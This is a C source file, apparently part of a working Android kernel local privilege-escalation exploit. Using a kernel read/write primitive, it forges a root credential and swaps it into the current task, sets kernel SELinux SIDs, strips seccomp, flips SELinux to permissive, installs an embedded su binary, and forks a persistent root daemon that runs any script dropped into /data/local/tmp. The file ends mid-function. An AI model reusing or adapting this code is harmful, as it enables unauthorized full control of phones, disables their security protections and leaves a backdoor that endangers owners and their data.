#include "common.h"

int root_child_done;
uint8_t selinux_before = 0xff;
uint8_t selinux_after = 0xff;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;
uint64_t capable_head_before;
uint64_t capable_head_after;
uint64_t init_tasks_prev;
uint64_t last_task_guess;
int setgid_ret = -1;
int setuid_ret = -1;
int setenforce_ret = -1;
int setenforce_errno;
uint64_t current_task_addr;
uint64_t current_cred_addr;
uint64_t current_real_cred_addr;
uint64_t current_cred_security_addr;
uint64_t current_real_cred_security_addr;
uint32_t cred_sid_before = 0xffffffff;
uint32_t cred_sid_after = 0xffffffff;
uint32_t real_cred_sid_before = 0xffffffff;
uint32_t real_cred_sid_after = 0xffffffff;
uint32_t target_cred_osid = SELINUX_KERNEL_SID;
uint32_t target_cred_sid = SELINUX_KERNEL_SID;
uint32_t selinux_cred_blob_off = SELINUX_CRED_BLOB_OFF;
int task_walk_iters;
uint64_t task_walk_last_entry;
uint32_t task_walk_last_pid;
uint32_t task_walk_last_tgid;
uint32_t found_task_pid;
uint32_t found_task_tgid;
char found_task_comm[TASK_COMM_LEN + 1];
pid_t root_child_pid = -1;
int root_ready_pipe[2] = {-1, -1};
struct root_shared *root_shared;

static void root_success_post_action(void) {
  const char *cmd = getenv("ROOT_CMD");
  const char *proof_path = getenv("ROOT_PROOF_PATH");
  int hold_sec = env_int_range("ROOT_HOLD_SEC", 0, 0, 86400);

  if (!proof_path || !proof_path[0]) {
    proof_path = "/data/local/tmp/root_proof.txt";
  }

  {
    char status_uid[128] = {0};
    char status_gid[128] = {0};
    char status_cap[128] = {0};
    char secontext[128] = {0};
    FILE *sf = fopen("/proc/self/status", "r");
    if (sf) {
      char line[256];
      while (fgets(line, sizeof(line), sf)) {
        if (!strncmp(line, "Uid:", 4)) {
          snprintf(status_uid, sizeof(status_uid), "%s", line);
        } else if (!strncmp(line, "Gid:", 4)) {
          snprintf(status_gid, sizeof(status_gid), "%s", line);
        } else if (!strncmp(line, "CapEff:", 7)) {
          snprintf(status_cap, sizeof(status_cap), "%s", line);
        }
      }
      fclose(sf);
    }
    {
      int cfd = open("/proc/self/attr/current", O_RDONLY | O_CLOEXEC);
      if (cfd >= 0) {
        ssize_t n = read(cfd, secontext, sizeof(secontext) - 1);
        close(cfd);
        if (n < 0) {
          n = 0;
        }
        secontext[n] = '\0';
        for (ssize_t i = 0; i < n; i++) {
          if (secontext[i] == '\n') {
            secontext[i] = '\0';
            break;
          }
        }
      }
    }

    int pfd = open(proof_path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
    if (pfd >= 0) {
      errno = 0;
      int chown_rc = fchown(pfd, 0, 0);
      int chown_errno = errno;
      errno = 0;
      int chmod_rc = fchmod(pfd, 0600);
      int chmod_errno = errno;
      dprintf(pfd,
              "pid=%d getuid=%u geteuid=%u nr_geteuid=%ld\n"
              "%s%s%s"
              "secontext=%s\n"
              "fchown_0_0=%d errno=%d fchmod_0600=%d errno=%d\n",
              getpid(), getuid(), geteuid(), syscall(__NR_geteuid),
              status_uid, status_gid, status_cap,
              secontext[0] ? secontext : "(none)", chown_rc, chown_errno,
              chmod_rc, chmod_errno);
      close(pfd);
      pr_info("root nosetuid proof wrote %s chown=%d/%d chmod=%d/%d "
              "secontext=%s\n",
              proof_path, chown_rc, chown_errno, chmod_rc, chmod_errno,
              secontext[0] ? secontext : "(none)");
    } else {
      pr_warning("root nosetuid proof open %s errno=%d\n", proof_path, errno);
    }
    fflush(stdout);
  }

  if (cmd && cmd[0]) {
    pr_info("root nosetuid ROOT_CMD begin: %s\n", cmd);
    fflush(stdout);
    errno = 0;
    int rc = system(cmd);
    pr_info("root nosetuid ROOT_CMD rc=%d errno=%d\n", rc, errno);
    fflush(stdout);
  }

  /*
   * Persistent root job runner (no Magisk / no setuid):
   *   echo 'id; cat /proc/self/status' > /data/local/tmp/root_job.sh
   *   # wait for root_job.out
   * Default on when ROOT_DAEMON unset or 1.
   */
  if (env_flag("ROOT_DAEMON", 1)) {
    pid_t d = fork();
    if (d == 0) {
      setsid();
      if (fork() == 0) {
        int nullfd = open("/dev/null", O_RDWR);
        if (nullfd >= 0) {
          dup2(nullfd, 0);
          dup2(nullfd, 1);
          dup2(nullfd, 2);
          if (nullfd > 2) {
            close(nullfd);
          }
        }
        int lfd = open("/data/local/tmp/rootd.log",
                       O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
        if (lfd >= 0) {
          dprintf(lfd, "rootd start pid=%d uid=%u euid=%u\n", getpid(),
                  getuid(), geteuid());
        }
        for (;;) {
          if (access("/data/local/tmp/root_job.sh", R_OK) == 0) {
            rename("/data/local/tmp/root_job.sh",
                   "/data/local/tmp/root_job.running");
            int out = open("/data/local/tmp/root_job.out",
                           O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
            if (out >= 0) {
              dup2(out, 1);
              dup2(out, 2);
              close(out);
            }
            int st = system("sh /data/local/tmp/root_job.running");
            if (lfd >= 0) {
              dprintf(lfd, "job rc=%d\n", st);
            }
            rename("/data/local/tmp/root_job.running",
                   "/data/local/tmp/root_job.done");
            /* restore daemon stdio to log */
            if (lfd >= 0) {
              dup2(lfd, 1);
              dup2(lfd, 2);
            }
          }
          usleep(200000);
        }
      }
      _exit(0);
    } else if (d > 0) {
      pr_info("root nosetuid ROOT_DAEMON forked pid=%d "
              "(drop jobs to /data/local/tmp/root_job.sh)\n",
              (int)d);
      fflush(stdout);
      int mfd = open("/data/local/tmp/.root_ok", O_WRONLY | O_CREAT | O_TRUNC,
                     0644);
      if (mfd >= 0) {
        const char msg[] = "status-uid 0/0 daemon=1\n";
        write(mfd, msg, sizeof(msg) - 1);
        close(mfd);
      }
    }
  }

  if (hold_sec > 0) {
    pr_info("root nosetuid hold pid=%d seconds=%d\n", getpid(), hold_sec);
    fflush(stdout);
    sleep((unsigned int)hold_sec);
  }
}

int spawn_root_child(void) {
  int prot = PROT_READ | PROT_WRITE;
  int flags = MAP_SHARED | MAP_ANONYMOUS;
  root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));
  memset(root_shared, 0, sizeof(*root_shared));
  SYSCHK(pipe(root_ready_pipe));

  root_child_pid = SYSCHK(fork());
  if (root_child_pid == 0) {
    close(root_ready_pipe[0]);

    prctl(PR_SET_NAME, "ll_root_child");
    char ready = 1;
    SYSCHK(write(root_ready_pipe[1], &ready, sizeof(ready)));

    for (int i = 0; i < 5000; i++) {
      if (atomic_load(&root_shared->go)) {
        break;
      }
      usleep(1000);
    }
    if (!atomic_load(&root_shared->go)) {
      _exit(2);
    }

    struct root_report report;
    memset(&report, 0, sizeof(report));
    report.uid_before = getuid();
    errno = 0;
    report.setgid_ret = setgid(0);
    report.setgid_errno = errno;
    errno = 0;
    report.setuid_ret = setuid(0);
    report.setuid_errno = errno;
    report.uid_after = getuid();
    report.gid_after = getgid();
    report.euid_after = geteuid();
    report.egid_after = getegid();
    int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
    if (enforce_fd >= 0) {
      ssize_t wrote = write(enforce_fd, "0", 1);
      report.setenforce_ret = wrote == 1 ? 0 : -1;
      report.setenforce_errno = wrote == 1 ? 0 : errno;
      close(enforce_fd);
    } else {
      report.setenforce_ret = -1;
      report.setenforce_errno = errno;
    }
    report.su_daemon_pid = -1;
    if (report.setgid_ret == 0 && report.setuid_ret == 0) {
      errno = 0;
      report.su_install_ret = install_embedded_su(&report.su_daemon_pid);
      report.su_install_errno = errno;
      errno = 0;
      /* [app-side patch 2026-10-01] wallpaper / soft-reboot step disabled:
         install_embedded_wallpaper() kills system_server -> framework-wide
         restart which kills the hosting app (app-side usage).
         su channels above are already installed at this point. */
      report.wallpaper_ret = 0;
      report.wallpaper_errno = ENOTSUP;
    } else {
      report.su_install_ret = 0;
      report.su_install_errno = EPERM;
      report.wallpaper_ret = 0;
      report.wallpaper_errno = EPERM;
    }
    root_shared->report = report;
    atomic_store(&root_shared->done, 1);
    _exit(report.uid_after == 0 ? 0 : 1);
  }

  close(root_ready_pipe[1]);

  char ready;
  ssize_t got = read(root_ready_pipe[0], &ready, sizeof(ready));
  return got == (ssize_t)sizeof(ready);
}

int collect_root_child(void) {
  if (!root_shared) {
    return 0;
  }
  atomic_store(&root_shared->go, 1);

  for (int i = 0; i < 5000; i++) {
    if (atomic_load(&root_shared->done)) {
      break;
    }
    usleep(1000);
  }
  if (!atomic_load(&root_shared->done)) {
    return 0;
  }

  struct root_report report = root_shared->report;
  root_uid_after = report.uid_after;
  setgid_ret = report.setgid_ret;
  setuid_ret = report.setuid_ret;
  setenforce_ret = report.setenforce_ret;
  setenforce_errno = report.setenforce_errno;
  waitpid(root_child_pid, NULL, 0);
  return report.uid_after == 0 && report.euid_after == 0 &&
         report.gid_after == 0 && report.egid_after == 0;
}

uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  uint64_t head = data_addr(INIT_TASK_TASKS);
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  uint64_t entry = pipe_read64(fd, head);
  task_walk_iters = 0;
  task_walk_last_entry = 0;
  task_walk_last_pid = 0;
  task_walk_last_tgid = 0;

  /*
   * Forward-only. Configfs arb-RW panics on some stale linear-map pages;
   * reverse-from-prev was the shell panic after linear probe. Prefer
   * direct-map list nodes (real tasks); allow kimage only for list head.
   */
  for (int i = 0; i < 4096; i++) {
    task_walk_iters = i + 1;
    task_walk_last_entry = entry;
    if (entry == canonical_head || entry == head) {
      break;
    }
    if (!is_direct_ptr(entry) && !is_kernel_ptr(entry)) {
      break;
    }
    /* Real tasks live in linear map; skip suspicious kimage nodes. */
    if (!is_direct_ptr(entry)) {
      pr_info("root walk[%d] skip non-linear entry=%016llx\n", i,
              (unsigned long long)entry);
      fflush(stdout);
      entry = pipe_read64(fd, entry);
      continue;
    }

    if (i < 8 || (i & 31) == 0) {
      pr_info("root walk[%d] entry=%016llx\n", i, (unsigned long long)entry);
      fflush(stdout);
    }

    uint64_t task = entry - TASK_TASKS_OFF;
    uint32_t pid = pipe_read32(fd, task + TASK_PID_OFF);
    uint32_t tgid = pipe_read32(fd, task + TASK_TGID_OFF);
    task_walk_last_pid = pid;
    task_walk_last_tgid = tgid;
    /* Sanity: reject clearly-non-task pages before reading comm. */
    if (pid == 0 || pid > 0x400000u || tgid == 0 || tgid > 0x400000u) {
      pr_info("root walk[%d] bad pid/tgid task=%016llx pid=%u tgid=%u\n", i,
              (unsigned long long)task, pid, tgid);
      fflush(stdout);
      entry = pipe_read64(fd, entry);
      continue;
    }
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);

    if (i < 8 || tgid == want_tgid || pid == want_tgid) {
      pr_info("root walk[%d] task=%016llx pid=%u tgid=%u comm=%s\n", i,
              (unsigned long long)task, pid, tgid, comm);
      fflush(stdout);
    }

    if (tgid == want_tgid || pid == want_tgid) {
      found_task_pid = pid;
      found_task_tgid = tgid;
      memcpy(found_task_comm, comm, sizeof(found_task_comm));
      return task;
    }

    entry = pipe_read64(fd, entry);
  }

  return 0;
}

#if defined(VR_CRED_GUARD_INIT_CRED) && VR_CRED_GUARD_INIT_CRED
static int install_vr_safe_init_cred(int fd, uintptr_t task,
                                    uintptr_t *old_real_cred,
                                    uintptr_t *old_cred) {
  const uintptr_t init_cred = canon_addr(INIT_CRED);
  const uintptr_t cred_slot = task + TASK_CRED_OFF;
  const uintptr_t real_slot = task + TASK_REAL_CRED_OFF;
  const uint32_t task_flags = pipe_read32(fd, task + TASK_FLAGS_OFF);
  const uint32_t uid = pipe_read32(fd, init_cred + CRED_UID_OFF);
  const uint32_t euid = pipe_read32(fd, init_cred + CRED_UID_OFF + 16);
  const uintptr_t user = pipe_read64(fd, init_cred + CRED_USER_OFF);
  const uint32_t user_uid = pipe_read32(fd, user + VR_USER_UID_OFF);
  uint64_t caps[CRED_CAP_WORDS] = {0};
  int caps_ok = pipe_phys_read_data(fd, init_cred + CRED_CAPS_OFF, caps,
                                   sizeof(caps));

  if (old_real_cred) {
    *old_real_cred = pipe_read64(fd, real_slot);
  }
  if (old_cred) {
    *old_cred = pipe_read64(fd, cred_slot);
  }

  for (size_t i = 0; i < CRED_CAP_WORDS && caps_ok; i++) {
    if (caps[i] & ~CAP_FULL) {
      caps_ok = 0;
    }
  }

  pr_info("root vr preflight task=%016llx flags=%08x pf_kthread=%u "
          "init_cred=%016llx uid=%u euid=%u user=%016llx user_uid=%u "
          "caps_ok=%d caps=%016llx/%016llx/%016llx/%016llx/%016llx\n",
          (unsigned long long)task, task_flags,
          !!(task_flags & (1U << VR_PF_KTHREAD_BIT)),
          (unsigned long long)init_cred, uid, euid,
          (unsigned long long)user, user_uid, caps_ok,
          (unsigned long long)caps[0], (unsigned long long)caps[1],
          (unsigned long long)caps[2], (unsigned long long)caps[3],
          (unsigned long long)caps[4]);
  fflush(stdout);

  if (!is_direct_ptr(task) || !is_kernel_ptr(init_cred) ||
      (!is_direct_ptr(user) && !is_kernel_ptr(user)) || uid != 0 ||
      euid != 0 || user_uid != 0 || !caps_ok ||
      (task_flags & (1U << VR_PF_KTHREAD_BIT))) {
    pr_info("root vr preflight rejected before cred write\n");
    return 0;
  }

  /* VR reads task->cred on every syscall, so install the complete cred first. */
  if (!pipe_write64(fd, cred_slot, init_cred)) {
    pr_info("root vr cred pointer write failed slot=%016llx\n",
            (unsigned long long)cred_slot);
    return 0;
  }
  uint64_t cred_rb = pipe_read64(fd, cred_slot);
  if (cred_rb != init_cred) {
    pr_info("root vr cred pointer mismatch slot=%016llx want=%016llx got=%016llx\n",
            (unsigned long long)cred_slot, (unsigned long long)init_cred,
            (unsigned long long)cred_rb);
    return 0;
  }

  if (!pipe_write64(fd, real_slot, init_cred)) {
    pr_info("root vr real_cred pointer write failed slot=%016llx\n",
            (unsigned long long)real_slot);
    return 0;
  }
  uint64_t real_rb = pipe_read64(fd, real_slot);
  pr_info("root vr cred switch old=%016llx/%016llx new=%016llx/%016llx "
          "order=cred-first ok=%d\n",
          (unsigned long long)(old_cred ? *old_cred : 0),
          (unsigned long long)(old_real_cred ? *old_real_cred : 0),
          (unsigned long long)cred_rb, (unsigned long long)real_rb,
          real_rb == init_cred);
  fflush(stdout);
  return real_rb == init_cred;
}
#endif

/*
 * clean_run4: in-place euid store panics on shell (Magisk already euid=0).
 * Forge a root cred on the GhostLock page and swing task->{real_,}cred.
 * Fake task_security_struct rides next to it — never pipe-write the live
 * SELinux slab blob (that hard-resets this image).
 */
#define FAKE_CRED_OFF 0xd00
#define FAKE_CRED_LEN 0x180
#define FAKE_SEC_OFF 0xe80
#define FAKE_SEC_LEN 0x40

int patch_cred_identity(int fd, uintptr_t cred) {
  if (!is_direct_ptr(cred) && !is_kernel_ptr(cred)) {
    return 0;
  }
  if (!page_base || !current_task_addr) {
    pr_info("root forge cred missing page/task page=%016zx task=%016llx\n",
            page_base, (unsigned long long)current_task_addr);
    return 0;
  }

  uint32_t euid_live = pipe_read32(fd, cred + CRED_UID_OFF + 16);
  uint64_t caps[CRED_CAP_WORDS] = {
      CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
  };
  uint32_t securebits = 0;

  /*
   * Do NOT mutate the live shared cred in-place on this image: the first
   * pipe-phys store into cred->uid hard-resets the device (after
   * "cred_uid before"). Forge a root cred on our held order-3 page and swing
   * task->{real_,}cred instead.
   */
  if (euid_live == 0 && geteuid() == 0) {
    pr_info("root cred euid already 0 — skip forge\n");
    fflush(stdout);
    return 1;
  }

  pr_info("root cred euid still %u → forge+swing (no live in-place)\n",
          geteuid());
  fflush(stdout);

  uint8_t buf[FAKE_CRED_LEN];
  memset(buf, 0, sizeof(buf));
  if (!pipe_phys_read_data(fd, cred, buf, sizeof(buf))) {
    pr_info("root forge cred read fail\n");
    return 0;
  }
  memset(buf + CRED_UID_OFF, 0, 32);
  memcpy(buf + CRED_SECUREBITS_OFF, &securebits, sizeof(securebits));
  memcpy(buf + CRED_CAPS_OFF, caps, sizeof(caps));
  uint64_t usage = 0;
  memcpy(&usage, buf, sizeof(usage));
  if (usage < 2) {
    usage = 2;
    memcpy(buf, &usage, sizeof(usage));
  }

  uintptr_t page0 = page_base & ~(PAGE_SIZE - 1ULL);
  uintptr_t fake = page0 + FAKE_CRED_OFF;
  uintptr_t fake_sec = page0 + FAKE_SEC_OFF;
  {
    uint8_t secblob[FAKE_SEC_LEN];
    uint32_t blob_off = selinux_cred_blob_off;
    memset(secblob, 0, sizeof(secblob));
    if (blob_off + 8 > sizeof(secblob)) {
      pr_warning("root forge sec blob_off=%u too large — clamp 0\n", blob_off);
      blob_off = 0;
    }
    /* task_security_struct: osid, sid, exec/create/key/sock create */
    uint32_t *tsec = (uint32_t *)(secblob + blob_off);
    tsec[0] = target_cred_osid;
    tsec[1] = target_cred_sid;
    if (filemap_poke_kva(fake_sec, secblob, sizeof(secblob)) != 0) {
      if (!pipe_phys_write_data(fd, fake_sec, secblob, sizeof(secblob))) {
        pr_info("root forge sec write fail\n");
        return 0;
      }
    }
    memcpy(buf + CRED_SECURITY_OFF, &fake_sec, sizeof(fake_sec));
    pr_info("root forge sec planted kva=%016zx blob_off=%u osid=%u sid=%u\n",
            fake_sec, blob_off, target_cred_osid, target_cred_sid);
    fflush(stdout);
  }

  /* Prefer filemap poke into painted page (no pipe into foreign slabs). */
  if (filemap_poke_kva(fake, buf, sizeof(buf)) != 0) {
    if (!pipe_phys_write_data(fd, fake, buf, sizeof(buf))) {
      pr_info("root forge cred write fail\n");
      return 0;
    }
  }
  pr_info("root forge cred planted fake=%016zx\n", fake);
  fflush(stdout);

  if (!pipe_write64(fd, current_task_addr + TASK_REAL_CRED_OFF, fake) ||
      !pipe_write64(fd, current_task_addr + TASK_CRED_OFF, fake)) {
    pr_info("root forge swing write fail\n");
    return 0;
  }

  uint64_t cred_rb = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
  uint64_t real_rb = pipe_read64(fd, current_task_addr + TASK_REAL_CRED_OFF);
  pr_info("root forge ptr rb cred=%016llx real=%016llx fake=%016llx "
          "getuid=%u geteuid=%u\n",
          (unsigned long long)cred_rb, (unsigned long long)real_rb,
          (unsigned long long)fake, getuid(), geteuid());
  fflush(stdout);

  current_cred_addr = fake;
  current_real_cred_addr = fake;

  {
    uint32_t fe = pipe_read32(fd, fake + CRED_UID_OFF + 16);
    char status_uid[128];
    memset(status_uid, 0, sizeof(status_uid));
    FILE *sf = fopen("/proc/self/status", "r");
    if (sf) {
      char line[256];
      while (fgets(line, sizeof(line), sf)) {
        if (strncmp(line, "Uid:", 4) == 0) {
          snprintf(status_uid, sizeof(status_uid), "%s", line);
          break;
        }
      }
      fclose(sf);
    }
    pr_info("root forge post fake_euid=%u getuid=%u geteuid=%u status=%s",
            fe, getuid(), geteuid(), status_uid);
    fflush(stdout);
  }

  /*
   * Kernel truth is /proc/self/status. Bionic may cache geteuid()=2000
   * even after cred swing (observed: status 0 0 0 0 vs geteuid 2000).
   */
  {
    unsigned ru = 1, eu = 1, su = 1, fu = 1;
    FILE *sf = fopen("/proc/self/status", "r");
    if (sf) {
      char line[256];
      while (fgets(line, sizeof(line), sf)) {
        if (strncmp(line, "Uid:", 4) == 0) {
          sscanf(line, "Uid: %u %u %u %u", &ru, &eu, &su, &fu);
          break;
        }
      }
      fclose(sf);
    }
    long sys_eu = syscall(__NR_geteuid);
    pr_info("root forge status-uid %u %u %u %u syscall %u/%u nr_geteuid=%ld\n",
            ru, eu, su, fu, getuid(), geteuid(), sys_eu);
    fflush(stdout);
    if (ru == 0 && eu == 0) {
      return 1;
    }
  }

  pr_info("root forge euid not live yet — need layout/path fix\n");
  fflush(stdout);
  return 0;
}

int patch_cred_sid(int fd, uintptr_t cred) {
  uint64_t security = pipe_read64(fd, cred + CRED_SECURITY_OFF);
  /* SELinux task blob may live in kimage .data; configfs fallback handles it. */
  if (!is_direct_ptr(security) && !is_kernel_ptr(security)) {
    pr_info("root bad cred security cred=%016llx security=%016llx\n",
            (unsigned long long)cred, (unsigned long long)security);
    return 0;
  }

  uint32_t sid_pair[2] = {
    target_cred_osid, target_cred_sid,
  };
  uintptr_t osid_addr =
    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
  return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));
}

int patch_cred_object(int fd, uintptr_t cred) {
  return patch_cred_identity(fd, cred) && patch_cred_sid(fd, cred);
}

static int patch_task_seccomp(int fd, uintptr_t task) {
  if (!is_direct_ptr(task)) {
    return 0;
  }

  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t atomic_flags_addr = task + TASK_ATOMIC_FLAGS_OFF;
  uintptr_t seccomp_addr = task + TASK_SECCOMP_OFF;

  uint64_t flags_before = pipe_read64(fd, flags_addr);
  uint64_t atomic_before = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_before = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_before =
    pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_before = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  uint32_t zero32 = 0;
  uint64_t zero64 = 0;

  int ok = 1;
  if (flags_want != flags_before) {
    ok &= pipe_write64(fd, flags_addr, flags_want);
  }
  if (atomic_want != atomic_before) {
    ok &= pipe_write64(fd, atomic_flags_addr, atomic_want);
  }
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_MODE_OFF, &zero32, sizeof(zero32));
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, &zero32, sizeof(zero32));
  ok &= pipe_phys_write_data(
    fd, seccomp_addr + SECCOMP_FILTER_OFF, &zero64, sizeof(zero64));

  uint64_t flags_after = pipe_read64(fd, flags_addr);
  uint64_t atomic_after = pipe_read64(fd, atomic_flags_addr);
  uint32_t mode_after = pipe_read32(fd, seccomp_addr + SECCOMP_MODE_OFF);
  uint32_t count_after = pipe_read32(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF);
  uint64_t filter_after = pipe_read64(fd, seccomp_addr + SECCOMP_FILTER_OFF);

  pr_info("root seccomp patched ok=%d flags=%016llx/%016llx "
          "atomic=%016llx/%016llx mode=%u/%u count=%u/%u "
          "filter=%016llx/%016llx\n",
          ok, (unsigned long long)flags_before,
          (unsigned long long)flags_after,
          (unsigned long long)atomic_before,
          (unsigned long long)atomic_after, mode_before, mode_after,
          count_before, count_after, (unsigned long long)filter_before,
          (unsigned long long)filter_after);

  int tif_clear = (flags_after & (1ULL << TIF_SECCOMP_BIT)) == 0;
  int nnp_clear = (atomic_after & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0;
  return ok && tif_clear && nnp_clear && mode_after == 0 &&
         count_after == 0 && filter_after == 0;
}

#if defined(VR_TAG_A_OFF) && defined(VR_TAG_B_OFF)
/* Clear the syscall trace bit first, then touch only the two vendor tag bytes. */
static int clear_vr_tags(int fd, uintptr_t task) {
  uint8_t zero = 0;
  uint8_t tag_a = 0xff;
  uint8_t tag_b = 0xff;
  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uint64_t flags_before = pipe_read64(fd, flags_addr);
  uint64_t flags_want = flags_before & ~((uint64_t)VR_SYSCALL_TP_FLAG);
  pipe_phys_read_data(fd, task + VR_TAG_A_OFF, &tag_a, 1);
  pipe_phys_read_data(fd, task + VR_TAG_B_OFF, &tag_b, 1);
  int ok = 1;
  if (flags_want != flags_before) {
    ok &= pipe_write64(fd, flags_addr, flags_want);
  }
  ok &= pipe_phys_write_data(fd, task + VR_TAG_A_OFF, &zero, 1);
  ok &= pipe_phys_write_data(fd, task + VR_TAG_B_OFF, &zero, 1);
  uint8_t tag_a_after = 0xff;
  uint8_t tag_b_after = 0xff;
  uint64_t flags_after = pipe_read64(fd, flags_addr);
  pipe_phys_read_data(fd, task + VR_TAG_A_OFF, &tag_a_after, 1);
  pipe_phys_read_data(fd, task + VR_TAG_B_OFF, &tag_b_after, 1);
  pr_info("root vr detag ok=%d task=%016llx flags=%016llx->%016llx "
          "tag=%u/%u->%u/%u\n",
          ok, (unsigned long long)task, (unsigned long long)flags_before,
          (unsigned long long)flags_after, tag_a, tag_b, tag_a_after,
          tag_b_after);
  return ok && (flags_after & (uint64_t)VR_SYSCALL_TP_FLAG) == 0 &&
         tag_a_after == 0 && tag_b_after == 0;
}

static int runtime_validate_address_domains(int fd) {
  uint64_t memstart_alias = 0, memstart_canon = 0;
  uint64_t kimage_voffset_alias = 0, kimage_voffset_canon = 0;
  uint64_t image_qword0 = 0;
  uintptr_t memstart_direct = data_addr(MEMSTART_ADDR);
  uintptr_t voffset_direct = data_addr(KIMAGE_VOFFSET);
  uintptr_t memstart_runtime = canon_addr(MEMSTART_ADDR);
  uintptr_t voffset_runtime = canon_addr(KIMAGE_VOFFSET);
  uint64_t expected_voffset = kaslr_base - P0_KERNEL_PHYS_LOAD;

  int ok = kaslr_done && is_direct_ptr(memstart_direct) &&
           is_direct_ptr(voffset_direct) &&
           kernel_read_data(fd, memstart_direct, &memstart_alias,
                            sizeof(memstart_alias)) == sizeof(memstart_alias) &&
           kernel_read_data(fd, memstart_runtime, &memstart_canon,
                            sizeof(memstart_canon)) == sizeof(memstart_canon) &&
           kernel_read_data(fd, voffset_direct, &kimage_voffset_alias,
                            sizeof(kimage_voffset_alias)) ==
               sizeof(kimage_voffset_alias) &&
           kernel_read_data(fd, voffset_runtime, &kimage_voffset_canon,
                            sizeof(kimage_voffset_canon)) ==
               sizeof(kimage_voffset_canon) &&
           kernel_read_data(fd, kaslr_base, &image_qword0,
                            sizeof(image_qword0)) == sizeof(image_qword0) &&
           memstart_alias == P0_PHYS_OFFSET &&
           memstart_canon == memstart_alias &&
           kimage_voffset_alias == expected_voffset &&
           kimage_voffset_canon == kimage_voffset_alias &&
           image_qword0 == TARGET_IMAGE_HEADER_QWORD0;
  pr_info("ADDRESS_DOMAIN_GATE pass=%d memstart_addr=%016llx/%016llx "
          "kimage_voffset=%016llx/%016llx expected=%016llx "
          "text=%016zx image_qword0=%016llx\n",
          ok, (unsigned long long)memstart_alias,
          (unsigned long long)memstart_canon,
          (unsigned long long)kimage_voffset_alias,
          (unsigned long long)kimage_voffset_canon,
          (unsigned long long)expected_voffset, kaslr_base,
          (unsigned long long)image_qword0);
  return ok;
}

static int install_android_root_carrier_only(int fd) {
  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  uint8_t enforcing = 0xff;
  if (!carrier_runtime_preflight(fd) ||
      !pipe_phys_read_data(fd, selinux_addr, &enforcing, sizeof(enforcing)) ||
      enforcing > 1) {
    pr_info("CARRIER_ROOT_GATE pass=0 stage=readonly enforcing=%u\n",
            enforcing);
    return 0;
  }
  selinux_before = enforcing;
  if (enforcing != 0) {
    uint8_t permissive = 0;
    if (!pipe_phys_write_data(fd, selinux_addr, &permissive,
                              sizeof(permissive)) ||
        !pipe_phys_read_data(fd, selinux_addr, &selinux_after,
                             sizeof(selinux_after)) ||
        selinux_after != 0) {
      pr_info("CARRIER_ROOT_GATE pass=0 stage=enforcing_write readback=%u\n",
              selinux_after);
      return 0;
    }
  } else {
    selinux_after = 0;
  }

  int finish = pd2241_bugreportd_su_finish(fd);
  if (finish != 0 && selinux_before != selinux_after) {
    uint8_t restore = selinux_before;
    (void)pipe_phys_write_data(fd, selinux_addr, &restore, sizeof(restore));
  }
  root_child_done = finish == 0;
  pr_info("CARRIER_ROOT_GATE pass=%d shell_uid=%u vr_shell_cred_write=0 "
          "selinux=%u->%u\n",
          root_child_done, getuid(), selinux_before, selinux_after);
  return root_child_done;
}

/* Full route never mutates the shell task or consumes unproven VR offsets. */
static int install_android_root_nosetuid(int fd) {
  pid_t self = getpid();
  root_uid_before = getuid();

  if (!runtime_validate_address_domains(fd)) {
    pr_info("root carrier blocked: memstart_addr/kimage_voffset/Image mismatch\n");
    return 0;
  }
  return install_android_root_carrier_only(fd);

  /*
   * Pin carrier PFN while still shell: ftrace mm_filemap works here; after
   * cred/selinux rewrite it does not (ev=0) and has panic'd on this build.
   */
  if (env_flag("BUGREPORTD_SU", 1)) {
#if defined(TARGET_CARRIER_PINNED_PATH) && defined(TARGET_CARRIER_CTOR0_OFF)
    if (!physrw_carrier_pfn_prefetch(fd, TARGET_CARRIER_PINNED_PATH,
                                     (off_t)TARGET_CARRIER_CTOR0_OFF)) {
      pr_info("bugreportd_su carrier_pref failed (finish may FAIL)\n");
      fflush(stdout);
    }
#endif
  }

  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  pipe_phys_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));
  selinux_cred_blob_off = pipe_read32(fd, data_addr(SELINUX_BLOB_SIZES));
  target_cred_osid = SELINUX_KERNEL_SID;
  target_cred_sid = SELINUX_KERNEL_SID;

  /* Unique comm so we can match without trusting every list pointer. */
  char want_comm[TASK_COMM_LEN];
  snprintf(want_comm, sizeof(want_comm), "p%x", (unsigned)self);
  prctl(PR_SET_NAME, want_comm);
  {
    char proc_comm[TASK_COMM_LEN + 1];
    memset(proc_comm, 0, sizeof(proc_comm));
    int cfd = open("/proc/self/comm", O_RDONLY);
    if (cfd >= 0) {
      ssize_t n = read(cfd, proc_comm, TASK_COMM_LEN);
      close(cfd);
